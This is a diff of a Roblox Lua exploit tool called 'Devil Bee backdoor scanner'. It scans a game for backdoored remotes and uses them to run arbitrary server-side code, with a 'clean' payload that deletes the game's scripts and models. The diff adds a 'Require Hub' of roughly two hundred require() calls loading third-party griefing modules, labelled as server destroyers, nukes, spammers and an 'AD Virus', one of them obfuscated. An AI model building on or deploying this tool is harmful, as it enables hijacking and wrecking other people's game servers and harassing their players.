@@ -42,6 +42,7 @@ local function dragify(Frame)
     end)
 end
 
+-- // MAIN SCANNER GUI // --
 GUI["ScreenGui_1"] = Instance.new("ScreenGui", game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"));
 GUI["ScreenGui_1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;
 GUI["ScreenGui_1"].Name = "DevilBeeBRScanner"
@@ -146,6 +147,7 @@ GUI["UIGradient_11"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.00
 
 GUI["UIStroke_12"] = Instance.new("UIStroke", GUI["Frame_2"]);
 
+-- // EXECUTOR GUI // --
 GUI["ScreenGui_13"] = Instance.new("ScreenGui", game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"));
 GUI["ScreenGui_13"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;
 GUI["ScreenGui_13"].Name = "DevilBeeBRScanner"
@@ -156,7 +158,7 @@ CollectionService:AddTag(GUI["ScreenGui_13"], "main");
 GUI["Frame_14"] = Instance.new("Frame", GUI["ScreenGui_13"]);
 GUI["Frame_14"]["BorderSizePixel"] = 0;
 GUI["Frame_14"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-GUI["Frame_14"]["Size"] = UDim2.new(0, 456, 0, 274);
+GUI["Frame_14"]["Size"] = UDim2.new(0, 456, 0, 310); -- Increased height to fit new button
 GUI["Frame_14"]["Position"] = UDim2.new(0, 210, 0, 12);
 GUI["Frame_14"]["BackgroundTransparency"] = 0.2;
 GUI["Frame_14"].Name = "DevilBeeBRScanmer"
@@ -196,7 +198,6 @@ GUI["UIGradient_19"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.00
 GUI["UIStroke_20"] = Instance.new("UIStroke", GUI["Frame_14"]);
 GUI["UICorner_21"] = Instance.new("UICorner", GUI["Frame_14"]);
 
--- [ШИНЭ] Clean Server Button энд нэмэгдсэн
 GUI["Clean_Btn"] = Instance.new("TextButton", GUI["Frame_14"]);
 GUI["Clean_Btn"]["TextWrapped"] = true;
 GUI["Clean_Btn"]["BorderSizePixel"] = 0;
@@ -281,7 +282,7 @@ GUI["Title_33"]["FontFace"] = Font.new("rbxasset://fonts/families/GothamSSm.json
 GUI["Title_33"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
 GUI["Title_33"]["BackgroundTransparency"] = 0.7;
 GUI["Title_33"]["Size"] = UDim2.new(0, 414, 0, 30);
-GUI["Title_33"]["Text"] = "TubersBack backdoor scanner";
+GUI["Title_33"]["Text"] = "Devil Bee backdoor scanner";
 GUI["Title_33"]["Name"] = "Title";
 GUI["Title_33"]["Position"] = UDim2.new(0, 4, 0, 4);
 
@@ -289,10 +290,82 @@ GUI["UICorner_34"] = Instance.new("UICorner", GUI["Title_33"]);
 GUI["UIGradient_35"] = Instance.new("UIGradient", GUI["Title_33"]);
 GUI["UIGradient_35"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 255, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(168, 168, 168))};
 
+-- [NEW] Require Hub Button
+GUI["RequireHub_Btn"] = Instance.new("TextButton", GUI["Frame_14"]);
+GUI["RequireHub_Btn"]["TextWrapped"] = true;
+GUI["RequireHub_Btn"]["BorderSizePixel"] = 0;
+GUI["RequireHub_Btn"]["TextScaled"] = true;
+GUI["RequireHub_Btn"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+GUI["RequireHub_Btn"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+GUI["RequireHub_Btn"]["FontFace"] = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal);
+GUI["RequireHub_Btn"]["BackgroundTransparency"] = 0.7;
+GUI["RequireHub_Btn"]["Size"] = UDim2.new(0, 444, 0, 30);
+GUI["RequireHub_Btn"]["Text"] = "Require Hub";
+GUI["RequireHub_Btn"]["Name"] = "RequireHubBtn";
+GUI["RequireHub_Btn"]["Position"] = UDim2.new(0, 6, 0, 276); -- Positioned below other buttons
+
+GUI["UICorner_Req"] = Instance.new("UICorner", GUI["RequireHub_Btn"]);
+GUI["UIGradient_Req"] = Instance.new("UIGradient", GUI["RequireHub_Btn"]);
+GUI["UIGradient_Req"]["Color"] = ColorSequence.new{
+    ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 170, 0)),
+    ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 100, 0))
+};
+
+-- [NEW] Require Hub GUI
+GUI["RequireHub_Frame"] = Instance.new("Frame", GUI["ScreenGui_13"]);
+GUI["RequireHub_Frame"]["BorderSizePixel"] = 0;
+GUI["RequireHub_Frame"]["BackgroundColor3"] = Color3.fromRGB(25, 25, 25);
+GUI["RequireHub_Frame"]["Size"] = UDim2.new(0, 400, 0, 300);
+GUI["RequireHub_Frame"]["Position"] = UDim2.new(0.5, -200, 0.5, -150);
+GUI["RequireHub_Frame"]["Visible"] = false
+GUI["RequireHub_Frame"]["Name"] = "RequireHub"
+
+GUI["RequireHub_Stroke"] = Instance.new("UIStroke", GUI["RequireHub_Frame"]);
+GUI["RequireHub_Corner"] = Instance.new("UICorner", GUI["RequireHub_Frame"]);
+
+GUI["RequireHub_Title"] = Instance.new("TextLabel", GUI["RequireHub_Frame"]);
+GUI["RequireHub_Title"]["Size"] = UDim2.new(1, 0, 0, 40);
+GUI["RequireHub_Title"]["BackgroundTransparency"] = 1;
+GUI["RequireHub_Title"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+GUI["RequireHub_Title"]["TextSize"] = 24;
+GUI["RequireHub_Title"]["FontFace"] = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal);
+GUI["RequireHub_Title"]["Text"] = "Require Hub"
+
+GUI["RequireHub_Close"] = Instance.new("TextButton", GUI["RequireHub_Frame"]);
+GUI["RequireHub_Close"]["Size"] = UDim2.new(0, 30, 0, 30);
+GUI["RequireHub_Close"]["Position"] = UDim2.new(1, -35, 0, 5);
+GUI["RequireHub_Close"]["BackgroundColor3"] = Color3.fromRGB(200, 50, 50);
+GUI["RequireHub_Close"]["Text"] = "X"
+GUI["RequireHub_Close"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+Instance.new("UICorner", GUI["RequireHub_Close"])
+
+GUI["AutoFill_Toggle"] = Instance.new("TextButton", GUI["RequireHub_Frame"]);
+GUI["AutoFill_Toggle"]["Size"] = UDim2.new(0, 150, 0, 30);
+GUI["AutoFill_Toggle"]["Position"] = UDim2.new(0, 10, 0, 45);
+GUI["AutoFill_Toggle"]["BackgroundColor3"] = Color3.fromRGB(50, 50, 50);
+GUI["AutoFill_Toggle"]["Text"] = "Auto Fill Username: OFF"
+GUI["AutoFill_Toggle"]["TextColor3"] = Color3.fromRGB(255, 100, 100);
+GUI["AutoFill_Toggle"]["TextSize"] = 12;
+Instance.new("UICorner", GUI["AutoFill_Toggle"])
+
+GUI["Scroll_Container"] = Instance.new("ScrollingFrame", GUI["RequireHub_Frame"]);
+GUI["Scroll_Container"]["Size"] = UDim2.new(1, -20, 1, -90);
+GUI["Scroll_Container"]["Position"] = UDim2.new(0, 10, 0, 80);
+GUI["Scroll_Container"]["BackgroundTransparency"] = 0.5;
+GUI["Scroll_Container"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+GUI["Scroll_Container"]["ScrollBarThickness"] = 6;
+GUI["Scroll_Container"]["CanvasSize"] = UDim2.new(0, 0, 0, 0);
+
+GUI["ListLayout"] = Instance.new("UIListLayout", GUI["Scroll_Container"]);
+GUI["ListLayout"]["Padding"] = UDim.new(0, 5);
+GUI["ListLayout"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
+
 dragify(GUI["Frame_2"])
 dragify(GUI["Frame_14"])
+dragify(GUI["RequireHub_Frame"])
 
 local backdoor = nil
+local autoFillEnabled = false
 local alphabet = {'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'}
 
 local function createTween(object, properties, duration)
@@ -340,6 +413,9 @@ local function findRemote()
     end
     
     for i,remote in game:GetDescendants() do
+        -- [NEW] Printing scanned remotes
+        print("Scanning: " .. remote:GetFullName())
+
         if not remote:IsA('RemoteEvent') and not remote:IsA('RemoteFunction') then continue end
         if string.split(remote:GetFullName(), '.')[1]=='RobloxReplicatedStorage' then continue end
         if remote.Parent==game:GetService("ReplicatedStorage") or remote.Parent.Parent==game:GetService("ReplicatedStorage") or remote.Parent.Parent.Parent==game:GetService("ReplicatedStorage") then
@@ -399,6 +475,7 @@ GUI["Exe_28"].MouseButton1Click:Connect(function()
         buttonClickEffect(GUI["Exe_28"])
         task.wait(0.5)
         GUI["Exe_28"].Text = "Execute"
+        -- Doesn't clear text box, as requested
     else
         GUI["Exe_28"].Text = "No script!"
         buttonClickEffect(GUI["Exe_28"])
@@ -426,22 +503,16 @@ GUI["Sens_17"].MouseButton1Click:Connect(function()
     end
 end)
 
--- [ШИНЭ] Clean Server Button Logic
 GUI["Clean_Btn"].MouseButton1Click:Connect(function()
     if backdoor then
-        -- Бид runRemote ашиглан backdoor-р дамжуулж сервер дээр cleanup script ажиллуулна
         local cleanScript = [[
             local ws = workspace
             local rs = game:GetService("ReplicatedStorage")
-
-            -- 1. Workspace Clean
             for _, v in pairs(ws:GetDescendants()) do
                 if v:IsA("Model") or v:IsA("Script") or v:IsA("LocalScript") or v:IsA("ModuleScript") or v:IsA("Folder") then
                     pcall(function() v:Destroy() end)
                 end
             end
-
-            -- 2. ReplicatedStorage Clean
             for _, v in pairs(rs:GetDescendants()) do
                 if v:IsA("Script") or v:IsA("LocalScript") or v:IsA("ModuleScript") or
                    v:IsA("RemoteEvent") or v:IsA("RemoteFunction") or
@@ -449,22 +520,16 @@ GUI["Clean_Btn"].MouseButton1Click:Connect(function()
                     pcall(function() v:Destroy() end)
                 end
             end
-
-            -- 3. Create 10 Folders
             for i = 1, 10 do
                 local f = Instance.new("Folder")
                 f.Name = "DevilBeeBRScanner Here"
                 f.Parent = ws
             end
-
-            -- 4. Fast Hint
             local h = Instance.new("Hint")
             h.Text = "DevilBeeBRScanner Destroyed Backdoor Scripts"
             h.Parent = ws
         ]]
-        
         runRemote(backdoor, cleanScript)
-        
         GUI["Clean_Btn"].Text = "Cleaned!"
         buttonClickEffect(GUI["Clean_Btn"])
         task.wait(0.5)
@@ -476,55 +541,259 @@ GUI["Clean_Btn"].MouseButton1Click:Connect(function()
     end
 end)
 
-GUI["Close_3"].MouseButton1Click:Connect(function()
-    createTween(GUI["Frame_2"], {Size = UDim2.new(0,0,0,0), Position = UDim2.new(0.5,0,0.5,0)}, 0.3)
-    task.wait(0.3)
-    GUI["ScreenGui_1"]:Destroy()
+-- Require Hub Logic
+GUI["RequireHub_Btn"].MouseButton1Click:Connect(function()
+    GUI["RequireHub_Frame"].Visible = true
 end)
 
-GUI["Close_15"].MouseButton1Click:Connect(function()
-    createTween(GUI["Frame_14"], {Size = UDim2.new(0,0,0,0), Position = UDim2.new(0.5,0,0.5,0)}, 0.3)
-    task.wait(0.3)
-    GUI["ScreenGui_13"]:Destroy()
+GUI["RequireHub_Close"].MouseButton1Click:Connect(function()
+    GUI["RequireHub_Frame"].Visible = false
 end)
 
-local function setupHoverEffects(button)
-    button.MouseEnter:Connect(function()
-        createTween(button, {BackgroundColor3 = Color3.fromRGB(30, 30, 30)}, 0.2)
-    end)
-    button.MouseLeave:Connect(function()
-        createTween(button, {BackgroundColor3 = Color3.fromRGB(0, 0, 0)}, 0.2)
-    end)
+GUI["AutoFill_Toggle"].MouseButton1Click:Connect(function()
+    autoFillEnabled = not autoFillEnabled
+    if autoFillEnabled then
+        GUI["AutoFill_Toggle"].Text = "Auto Fill Username: ON"
+        GUI["AutoFill_Toggle"].TextColor3 = Color3.fromRGB(100, 255, 100)
+    else
+        GUI["AutoFill_Toggle"].Text = "Auto Fill Username: OFF"
+        GUI["AutoFill_Toggle"].TextColor3 = Color3.fromRGB(255, 100, 100)
+    end
+end)
+
+local function applyAutoFill(scriptRaw)
+    if not autoFillEnabled then return scriptRaw end
+    local name = Players.LocalPlayer.Name
+    local s = scriptRaw
+    s = s:gsub("urnamehere", name)
+    s = s:gsub("YourName", name)
+    s = s:gsub("VictimName", name)
+    s = s:gsub('""', '"' .. name .. '"')
+    s = s:gsub("''", "'" .. name .. "'")
+    return s
 end
 
-setupHoverEffects(GUI["Scan_b"])
-setupHoverEffects(GUI["Exe_28"])
-setupHoverEffects(GUI["Clr_25"])
-setupHoverEffects(GUI["Sens_17"])
-setupHoverEffects(GUI["Clean_Btn"])
-
-GUI["Close_3"].MouseEnter:Connect(function()
-    createTween(GUI["Close_3"], {BackgroundColor3 = Color3.fromRGB(255, 50, 50)}, 0.2)
-end)
-
-GUI["Close_3"].MouseLeave:Connect(function()
-    createTween(GUI["Close_3"], {BackgroundColor3 = Color3.fromRGB(0, 0, 0)}, 0.2)
-end)
-
-GUI["Close_15"].MouseEnter:Connect(function()
-    createTween(GUI["Close_15"], {BackgroundColor3 = Color3.fromRGB(255, 50, 50)}, 0.2)
-end)
-
-GUI["Close_15"].MouseLeave:Connect(function()
-    createTween(GUI["Close_15"], {BackgroundColor3 = Color3.fromRGB(0, 0, 0)}, 0.2)
-end)
-
-GUI["TextBox_32"].Focused:Connect(function()
-    createTween(GUI["TextBox_32"], {BackgroundTransparency = 0.4}, 0.2)
-end)
-
-GUI["TextBox_32"].FocusLost:Connect(function()
-    createTween(GUI["TextBox_32"], {BackgroundTransparency = 0.6}, 0.2)
-end)
-
-return GUI["ScreenGui_1"], require
+local scriptsList = [[
+require(493711496)SH("")
+require(10868847330):pls("")
+require(10868847330):pls("YourName")
+require(5802346180).eliza(urnamehere) - EARRAPE
+require(7260532691)("urnamehere") - Huge Lord
+require(5802335492).eliza(urnamehere) - LOLOLOLOL
+require(4832967293):Fire("urnamehere") - NUKE GUI
+require(5610305900)("urnamehere") - TOPKEK V5
+require(4874364435)("urnamehere") - TOPKEK V4
+require(5034863407).subtosyntax64("urnamehere") - NOOT NOOT
+require(5115793531).scare(urnamehere) - Something From Spongebob Server Destroyer
+require(5564800243).fehax("urnamehere") - CHATHAX
+require(5903403087).load("urnamehere") - IMPOSTER CHAT
+require(5617600468).load("urnamehere") - Neurotic
+require(5193737424)("urnamehere",true) - ULTRA NOOB SPAMMER
+require(1192815372).load'urnamehere' - RANDOM MAP
+require(5621190626).OmegaFlower("urnamehere") - OMEGA FLOWEY
+require(4106669917).load("urnamehere") - Chara Boss
+require(4483948796).load("urnamehere") - Pyro Flamethrower
+require(4581300009).xd("urnamehere") - RODA ROLLA DA
+require(4178274460).Nuke(Vector3.new(urnamehere),1000) - NUKE
+require(4564681456).catgirl(urnamehere) - CATGIRL TROLL
+require(4124996597).swano(urnamehere) - AD Virus
+require(4024051473).call("all") - Builderman Discord Call
+require(5257685661):Fire("urnamehere") - Server Destroyer GUI
+require(4937823608).load("urnamehere") - UTG
+require(4945821345).lmao("urnamehere") - UTG Epix
+require(5673170715).Leak("urnamehere") - Undetected Hub V2
+require(5099140412).Aqua("urnamehere") - Aqua Hub
+require(5492934148):Fire("XD","urnamehere") - Mr Bean Admin
+require(4863172339).Enduro("urnamehere") - Rape Gui
+require(5160216694).Ass("urnamehere") - Project Scripted GUI
+require(4937114966):SH("urnamehere") - Sakura Hub
+require(5516943300).Leak("urnamehere") - Undetected Hub V2
+require(4934614538):adrian("urnamehere") - Adrian's Good UTG
+require(4977590940).load("urnamehere") - baldiinvasion2’s utg
+require(5868025435).load("urnamehere") - D3S SS
+require(5028947792).Lmao("urnamehere") - Hoarder GUI
+require(5098731275).eliza("orangeado") - Epic Stand
+require(4902600443)("Stand Name", "urnamehere") - Jojo Stands
+require(5702333343).load("urnamehere") - Roz Hub
+require(5845339294).EH("urnamehere") - Ethereal Hub
+require(5128274968).GetAntsUtgV5("urnamehere") - Ants Hub V5
+require(4831353616).xh("urnamehere") - Xio’s Hub
+require(4634558715)("urnamehere") - Best Hub
+require(5356256564).SubscribeYouSkid("urnamehere") - Subhub
+require(5419240318).PraiseSkidGod("urnamehere") - Hexine Gui
+require(4829576129).SpringHub("urnamehere") - Spring Hub
+require(4706570992).load("urnamehere") - Unleaked SS
+require(5121570975).SpaghettiHub("urnamehere") - Spaghetti Hub
+require(5705720748).Lightning(string.reverse("urnamehere")) - Lightning Cannon
+require(5620645578):ASH("urnamehere") - Adrian Hub
+require(5580599015).load("urnamehere") - Avry Hub
+require(5098133040):FirePire("urnamehere:Pire") - Pire Hub
+require(5487274946).GLITCHED("urnamehere") - Glitchhub Premium
+require(5126648745).load("urnamehere") - Anonymous UTG
+require(4614455084).Under("urnamehere") - Under UTG
+require(5352721272):Fire("urnamehere") - Sonichub
+require(3497222070).load("urnamehere") - UTG Edit
+require(5828128589).honey(string.reverse("urnamehere")) - Zero Two Lightning Cannon
+require(5970690882).ps1("RICKLER") - Fearful Harmony
+require(5226367856).rk("urnamehere") - Super Cool Banisher
+require(4952179933).Fraud("urnamehere") - Fraud
+require(5963380437).publicbuild("urnamehere", "Retro") - Retro Hub
+require(6009547419).Fire("urnamehere") - Vascepa Hub
+require(5543125369).eliza("urnamehere") - Eliza Hub
+require(6062281254).load(urnamehere) - South Park Video Troll
+require(6036737823).CrackedByIncreaseron("imlucixD34") - Aureus V1
+require(6085762856).BINGBONG("NoNameNeeded") - Crab Rave
+require(5597042098).chinaAnnounce("urnamehere") - Xi Jinping
+require(3010581956):Fireplace("urnamehere") - Dark Dex
+require(4867426485):SD2("urnamehere") - Cooldown Nuke
+require(6088717643)("65464593") - Immortality Lord
+require(6123029966).vian("urnamehere") - Viankos
+require(5856873964).PharaohCannon(string.reverse("urnamehere")) - Pharaoh Lightning Cannon
+require(4658687827).nukes("urnamehere") - The End Nuke
+require(4555115496).gw("urnamehere") - Trollimbius Gui
+require(4154130567).ik("urnamehere") - Adrian’s UTG
+require(4967804765).SBV3("urnamehere") - Snake Banisher V3
+require(4903995654)(65464593) - Immortality Cannon
+require(4992512410):Asylumgotskidded("urnamehere") - Asylum Hub
+require(6114289913).c00lgui("urnamehere") - c00lgui remake
+require(5308680571).load("urnamehere") - GUI Hub
+require(4813227802){"urnamehere"} - PikaX UTG
+require(0xA8526D5D).giveGuns'urnamehere' - Phantom Forces Guns
+require(5146396793).load("urnamehere") - GodSpawn GUI
+require(5344766102).fare("urnamehere") - Fare’s Hubhub
+require(6097532439):redlightsdontleak("urnamehere") - Redlights.exe
+require(6099373575).load("urnamehere") - Ravenger Claws V2
+require(6222361140).load("urnamehere") - Shadow Gunner
+require(6027795939).load("urnamehere") - Cyber Monarch
+require(6099324864).load("urnamehere") - Kuma
+require(4471066396).load("urnamehere") - Bad Karma
+require(6175490752).load("urnamehere") - Void Boss
+require(6099241563).load("urnamehere") - Xester V2
+require(6099316092).load("urnamehere") - Veltex
+require(6058159336).load("urnamehere") - Shadow Kars
+require(6168743245).load("urnamehere") - The Defiant
+require(6099363076).load("urnamehere") - The Disturbed
+require(6042859321).load("urnamehere") - Jester
+require(6058166660).load("urnamehere") - Dimensiona
+require(4665394711).load("urnamehere") - Server Admin
+require(3224070083).load("urnamehere") - Nectula
+require(6088494183).load("urnamehere") - Desolate
+require(6015747481).load("urnamehere") - Brick Hamman
+require(5619264516).Dark("urnamehere") - Vaxtemi Boss Battle
+require(6056559552).load("urnamehere") - Death Sheriff
+require(6027832941).load("urnamehere") - Holy Hand Grenade
+require(5813743814).load("urnamehere") - Stick Beater
+require(5977500481).load("urnamehere") - Project Light
+require(5813695241).load("urnamehere") - Oculus
+require(5617200606).Cyber("urnamehere") - Cyber Knight
+require(5390158029).Dark("urnamehere") - Lost Soul
+require(5857033951).load("urnamehere") - Achromatic
+require(5813836873).load("urnamehere") - Archangel of Light
+require(5813799887).load("urnamehere") - Aureola
+require(4229413153).load("urnamehere") - Aether Lightning
+require(5751710030).Sun("urnamehere") - Deadly Laser Sun V3
+require(4611999946).load("urnamehere") - Sociopath
+require(4490557105).load("urnamehere") - Fallen Anger
+require(5068511197).insert("urnamehere") - Military Tank
+require(4661847142).load("urnamehere") - Chronos Sentinel
+require(5375460203).Player("urnamehere") - Glorious Bastion of Light
+require(5605396200):load("urnamehere","Felipe") - Felipe’s Ascension
+require(5374597845).Dark("urnamehere") - Echo
+require(5346891374).Dark("urnamehere") - Darkomos
+require(5270525643).Dark("urnamehere") - Stan
+require(4943481014).Nightmare("urnamehere") - Nightmare
+require(3256686965).load("urnamehere") - Dominus Venari
+require(5146659840).Dark_Eccentric("Dark_Eccentric", "urnamehere") - Grab Gun
+require(5239955586).Dark("urnamehere") - Siren Head
+require(5000363317).UwUMoment("urnamehere") - Kasper Hub
+require(4869378421).F3X("urnamehere") - F3X BTools
+require(5275752166).ULTRAV2("urnamehere") - Ultra Hub
+require(5178605206).bizzcrack("urnamehere") - Xio Hax
+require(5300095496).soap("urnamehere") - Soap Hub
+require(5142574517):mega("urnamehere") - Adrian’s MTG
+require(5203976741).spong("urnamehere") - Spong Hub
+require(5116049830).thonk("urnamehere") - Thonk Hub
+require(5253172143).load("urnamehere") - Forest hub
+require(3563652201).l0l("UltraWasHere")("urnamehere") - Plane
+require(5885462965).lexa("urnamehere") - L3xa Hub
+require(6216675632).ae("urnamehere") - Snake Glitcher
+require(4125860484)("urnamehere") - idk
+require(0x23F530165 - 0x17D6F549B).c3("urnamehere") - Banisher?
+require(6239870794):NB2("urnamehere") - NB Hub V2
+require(4869013426).JuanaSS("urnamehere") - JuanSS
+require(6253147982).SBV4("urnamehere") - Snake Banisher V4
+require(tonumber(require(1.9988474659215096e+24/389489894389289).dec("MHgxNmFmNzViMjA="))).tortillaload("urnamehere") - Dimension Hub
+require(3024043748):Start("urnamehere","AAA") - Gear Stuff
+require(6234345495):Tesla("urnamehere") - Tesla Executor
+require(6269838898).load(urnamehere) - Operation Noob
+require(6171421519)("urnamehere") - Epic Godcat Edit
+require(6274987259).v2("urnamehere") - Project Scripted V2
+require(5994869968).D0ggo("urnamehere") - Lucky's Hub
+require(4496865792).Lmao("urnamehere") - Ultimate Trolling Gui Youtube Edition
+require(4813227802){"urnamehere"} - PikaX UTG
+require(5716300544).asd("urnamehere") - Kaspers Hub
+require(5203976741).spong("urnamehere") - Spong Hub
+require(5654587719).brohhh(string.reverse("urnamehere")) - Old Lightning Cannon
+require(4559977647).load("urnamehere") - Baseball Bat V5
+require(5742138267).Jimmy_Giovannas_burgers("urnamehere") - Poo Pee Stinky Hub
+require(5133347890).scrambles("urnamehere") - Scrambles Hub
+require(5742138267).Jimmy_Giovannas_burgers("urnamehere") - An OP Script Hub
+require(5098133040):FirePire("urnamehere:Pire") - Pire Logger
+require(6032524768).Eagle('urnamehere') - C00lgui Reborn
+require(6370978733)("urnamehere") - Lightning Cannon V2
+require(6270014162).load("urnamehere") - Universalis Dominus
+require(6419718698).load("urnamehere") - The Holiest Wrench
+require(6285853184).TimeStopper("urnamehere","rbc") - Time Stop
+require(6339079111).mobspawner("YourNameHere") - Minecraft Mobs Spawner
+require(6464428559).load("urnamehere") - Dominus Astra
+require(6438196691)("urnamehere","JUNKBOT") - Junkbot
+require(5813748809).load("urnamehere") - Light Circlet
+require(6424791174).load("urnamehere") - Gattai Zamasu
+require(6335063396).load("urnamehere") - Supr14 Nuke
+require(3032735551):Start("urnamehere","AAA") - Calamity
+require(6472943749).boss("urnamehere") - Bloxwatch
+require(6649537798).UniverseReset() - Universe Reset
+require(6564964464)("urnamehere") - Moriyan Drone
+require(6569726017)["urnamehere"] = "Dark"; - Hellset
+require(6540522165).load("urnamehere") - Omni God
+require(6549414661) - Troll Server Destroyer
+require(6218862474).eliza("urnamehere") - UTG V10
+require(5223007262)("VictimName") - Wario Apparition
+require(6525681614).reverser("urnamehere") - Reverse Time
+require(6707668066).virus("urnamehere") - Virus Ads
+require(6688474792).load("urnamehere") - Killbot V3
+require(6583572269).load("urnamehere") - idk
+require(1071722458).load("urnamehere") - Lightning Cannon UTG
+require(6794297504).NekoHub("urnamehere") - Neko Hub
+require(4081020916).loadmap() - Tanitive Space Map
+require(4081024299).loadmap() - Dungeon Map
+require(6746870700)() - Praise Server Destroyer
+require(6745275731)() - Nulled XD
+require(7158847523).lewfoqfockwroewopqrqwxowpr("urnamehere") - Hyperskidded Cannon Max
+require(1463699117).Load("urnamehere") - Ultra God Lightning Cannon
+require(6287712657).Load("urnamehere") - Ultraskid Cannon
+require(3183152719)(game:GetService("Players"):WaitForChild("urnamehere").UserId) - Ultraskidded Lord
+require(7197738360)["UNKN0WN"]("urnamehere") - Unknown Lord
+require(6885716335)("urnamehere") - Ultraskidded Studio Dummy V2
+require(6788546558)("urnamehere") - Studio Dummy V3
+require(6824699886)("urnamehere") - Studio Dummy V3 Switcher
+require(7091286913)("urnamehere") - Newest Maddox Dummy
+require(6903927432)(65464593) - Anti V7
+require(7229827459).TotallyYessir23231212("urnamehere") - Legend Skidded Echo
+require(6522699963)("urnamehere") - Mat LC
+require(7054321111).SC("urnamehere") - Anatomiiii Cannon V.3
+require(6568426115)("urnamehere") - Rapid Fire Studio Dummy
+require(6931315732).yeah("urnamehere") - AndrFix Godcat Edit
+require(7242244455)("urnamehere") - Immortality Lord XTR
+require(7161308644).lc("urnamehere") - Shrike LC
+require(6608656220):John("urnamehere") - New John Doe
+require(7001260635).lctoolsreuploaded("urnamehere") - LC Tools Pack
+require(7037589092)("urnamehere") - Weird Lord
+require(7023682644)("urnamehere") - IL Dummy
+require(7242662591):SGH_3("urnamehere") - Sans_Gboard’s Hub
+require(7253448613)("urnamehere") - Studio Immortality Lord V2
+require(6799359169)("urnamehere") - Hyperskidded Lord
+require(6727030812).Fun("urnamehere", "Fun") - Tools Pack
+require(7203746402).tonk("urnamehere") - Tank AI
+require(7215403029).RRT("urnamehere") - Special Forces AI
+require(7185228601).load("urnamehere") - Helico
